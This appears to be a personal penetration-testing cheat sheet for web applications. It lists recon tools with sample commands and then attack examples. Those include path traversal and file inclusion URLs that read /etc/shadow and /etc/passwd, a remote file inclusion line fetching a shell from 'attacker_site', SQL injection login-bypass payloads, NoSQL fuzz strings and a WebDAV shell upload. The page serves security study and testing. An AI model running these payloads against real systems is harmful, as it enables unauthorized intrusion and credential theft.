---
layout: page
title: notes
permalink: /notes/
image: '/images/50.jpg'
---

{% include toc.html %}

* g
{:toc}

***

### Web Application Testing
#### Enumeration

• theHarvester.py: Identify subdomains, IP addresses, and email addresses associated with the target.
{% highlight sh %}
python3 theHarvester.py -d example.org -n -c -t -b google
{% endhighlight %}
• dig: Check the Domain Name System (DNS) information of the target.
{% highlight sh %}
~ dig kvdn.co a; @8.8.8.8
~ dig -x kvdn.co
{% endhighlight %}
• dirb: Mass scan for directories & sub-directories by bruteforcing.
{% highlight sh %}
~ dirb http://kvdn.co /usr/share/wordlists/dirb/common.txt
{% endhighlight %}
• gobuster: Another mass scanner for directories, taking a wordlist as input.
{% highlight sh %}
~ gobuster dir -u http://kvdn.co -w /usr/share/wordlists/dirb/common.txt
{% endhighlight %}
• nikto: Automated web enumeration tool, with a focus on finding vulnerabilities & misconfigurations.
{% highlight sh %}
~ nikto -h http://kvdn.co -C all -Plugins all
{% endhighlight %}
• wappalyzer: Node-based tool for identifying the CMS, framework, analytical tools. Find what stack the target is using.
{% highlight sh %}
~ wappalyzer http://kvdn.co
{% endhighlight %}
• Manual Enumeration: Check for what resources the application is loading, asset directories, javascript libraries and their versions, developer comments. Also worthwhile checking robots.txt, crossdomain.xml and clientaccesspolicy.xml (if they exist). Map out how the application works, and how users interact with it. Is the SSL certificate still valid? Do forms lack CSRF tokens, or is there anything in local storage to stop cross site attacks?

• <a href="https://github.com/urbanadventurer/WhatWeb" target="_blank">WhatWeb</a>: An alternative to wappalyzer, with far more information. Knowing the various technologies that the target employs is key to mapping out any target.
{% highlight sh %}
~ ./whatweb kvdn.co
{% endhighlight %}

• <a href="https://github.com/wapiti-scanner/wapiti" target="_blank">Wapiti</a>: A complete suite of tools, in one, for automating the assessment and identification of vulnerabilities in a web app.
{% highlight sh %}
~  wapiti -u http://kvdn.co -l 2
{% endhighlight %}

• <a href="https://github.com/maurosoria/dirsearch" target="_blank">DirSearch</a>: Powerfuk recursive path bruteforcing tool, which allows you to focus on a specific extension.
{% highlight sh %}
~ python3 dirsearch.py -u http://kvdn.co/ -e .php,asp,html
{% endhighlight %}
• wpscan: Automated vulnerability scanner for wordpress websites/blogs. Well equiped to pick up on exploitable plugins.
{% highlight sh %}
~ wpscan -url http://kvdn.co/ -enumerate p
{% endhighlight %}
• droopescan: Similar to wpscan, an automated vulnerability scanner for drupal applications.
{% highlight sh %}
~ droopescan scan -u $ip
{% endhighlight %}

• <a href="https://github.com/lightos/Panoptic/" target="_blank">Panoptic.py</a>: Automated search tool for common log and config files, through path traversal.
{% highlight sh %}
~ ./panoptic.py --url "http://kvdn.co/include.php?file=test.txt"
{% endhighlight %}

• <a href="https://github.com/hatRiot/clusterd" target="_blank">clustered.py</a>: Fingerprint any given web application to find it's version.
{% highlight sh %}
~ ./clusterd.py --fingerprint  -i http://kvdn.co
{% endhighlight %}

• <a href="https://github.com/lokifer/BlindElephant" target="_blank">BlindElephant.py</a>: Another tool similar to clusterd, solely dedicated to fingerprinting a web-app.
{% highlight sh %}
~ ./BlindElephant.py http://kvdn.co
{% endhighlight %}

• <a href="https://github.com/truerandom/crawleet" target="_blank">crawleet.py</a>: A more general web recon & exploitation tool which works with drupal, joomla, wordpress, and other CMS software.
{% highlight sh %}
~ python3 crawleet.py -u http://kvdn.co
{% endhighlight %}

• wfuzz: Web fuzzing tool dedicated to enumerating, and identifying possibly hidden pages.
{% highlight sh %}
~ wfuzz -c -z range,1-500 --hc 404 http://kvdn.co/FUZZ
{% endhighlight %}

• <a href="https://github.com/TheRook/subbrute" target="_blank">subbrute.py</a>: Fast, sub-directory recon tool if the scope is *.domain.tld
{% highlight sh %}
~ python3 subbrute.py kvdn.co
{% endhighlight %}

• <a href="https://github.com/s0md3v/Arjun" target="_blank">Arjun</a>: Bruteforce query parameters for any URL endpoints, with added support for POST-JSON/POST-XML.

• <a href="https://github.com/Sh1Yo/x8" target="_blank">x8</a>: Another tool similar to Arjun, that identifies hidden parameters in a given endpoint.
{% highlight sh %}
~ x8 -u "https://kvdn.co/" -w <wordlist>
~ x8 -u "https://kvdn.co/" -X POST -w <wordlist>
{% endhighlight %}

• <a href="https://github.com/tomnomnom/waybackurls" target="_blank">waybackurls</a>: Tool to search Wayback Machine for any historical snapshots pertaining to a *.domain

#### Attacks
• Does a path look like a file? Test for path traversal, remote file inclusion & local file inclusions:
{% highlight sh %}
http://kvdn.co/../../../../etc/shadow # path traversal to expose sensitive information

http://kvdn.co/vuln_page.php?file=http://attacker_site/shell.php # remote file inclusion to execute a shell on the target application

http://kvdn.co/preview.php?file=../../../../etc/passwd # local file inclusion to exposed sensitive information
{% endhighlight %}

• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank">Extensive File Inclusion Documentation (PayloadsAllTheThings)</a>

• Does a path look like a URL? Test for open redirection & server-side request forgery:
{% highlight sh %}
http://kvdn.co/example.php?url=http://malicious.example.com # open redirection to an external address
{% endhighlight %}

• Reflected XSS: Reflected malicious code within the client side. 

• DOM-Based XSS: Manipulating the document object model of a user's browser. 

• Stored XSS: Storing malicious code within the web application. Can be accessed by anyone, thus making it the most dangerous of the three.

• Avatars & File Uploads: SVGs can have XML embedded which can trigger SSRFs, and XXEs. Unsanitized file upload paths, can also be used to achieve a shell on the target.

• SQLi: Query all URL parameters, and forms, by sending ' " and ;
{% highlight sh %}
# boolean payloads to bypass authentication forms
2' or '1'='1
' or 1=1 --
a' or 1=1 --
" or 1=1 --
a" or 1=1 --
' or 1=1 #
" or 1=1 #
or 1=1 --
' or 'x'='x
" or "x"="x
') or ('x'='x
") or ("x"="x
' or username LIKE '%admin%
' or ( 1=1 and username='admin');
admin' --
%bf%27 or 1=1 --
{% endhighlight %}

• API Key Leaks: Look for hidden developer keys, which may be used to expose sensitive information. A helpful tool for finding leaks in the wild is <a href="https://github.com/momenbasel/KeyFinder" target="_blank">keyFinder</a>.

• Account Takeovers: Bad registration/authentication forms, might be loosely validating user input. A password reset form might allow you to specify a certain email for a given UID. CSRF can be exploited if there are no measures implemented. IDOR on API parameters, could allow someone to edit and create user profiles as they wish. Password tokens could also be generated, especially if the sequence is easily identifiable.

• CORS Misconfiguration: The same-origin policy might be incorrectly set, allowing the attacker to specify a custom origin for any request made to the target application.

• <a href="https://www.erasec.be/blog/client-side-path-manipulation/" target="_blank">Client Side Path Manipulation</a>

• <a href="https://github.com/nccgroup/singularity" target="_blank">Signularity</a>: A DNS rebinding tool, which allows an attacker to bypass the same-origin policy to pass arbitrary requests.

• Insecure Direct Object References: Access sensitive information, by tampering with endpoints that do not validate a user's privileges correcty. Example: A change email form, might use the $user_id as input, and does not validate the input whatsoever. UUID and GUID can also be easily used in the context of IDOR, as it is easily predictable. Try PUT requests where POST requests might be. Pass JSON values as arrays.

• <a href="https://github.com/codingo/NoSQLMap" target="_blank">NoSQLMap</a>: Automated NoSQL injection tool. Performs both syntax injections (breaking the query syntax), and operator injections which uses NoSQL query operators to manipulate queries.
{% highlight sh %}
# NoSQL injection fuzz queries
'"`{
;$Foo}
$Foo \xYZ
{% endhighlight %}

• <a href="https://github.com/swisskyrepo/SSRFmap" target="_blank">SSRFMap</a>: Auomated SSRF fuzzing tool, which takes a burp request alongside a set parameter. 

• <a href="https://github.com/kurobeats/fimap" target="_blank">fimap</a>: Another automated tool for identifying local and remote file inclusions.

• cadaver: Simple tool designed to allow the upload of a file to a web application with WebDav folders using the PUT method.
{% highlight sh %}
~ cadaver http://kvdn.co/dav/
dav:/dav/> put /path/to/php.shell
{% endhighlight %}

• <a href="https://github.com/P0cL4bs/kadimus" target="_blank">Kadimus</a>: Tool which allows an attacker to check, and exploit LFI vulnerabilities. Checks all the most likely paths for RCE and information disclosure.
{% highlight sh %}
~ kadimus --url http://kvdn.co
{% endhighlight %}

• XML External Entity Injection (XXE): Can be used to retrieve sensitive files/data, perform SSRF attacks. It's leveraged by tampering with an application's method of processing XML data.

***
### Network Testing & Infrastructure
#### Reconaissance
#### Exploitation

***
### Privilege Escalation
#### Linux
#### Windows

***
### Active Directory Attacks
#### Lateral Movement
### Cloud Testing
#### Azure
#### AWS
#### GCP
#### Kubernetes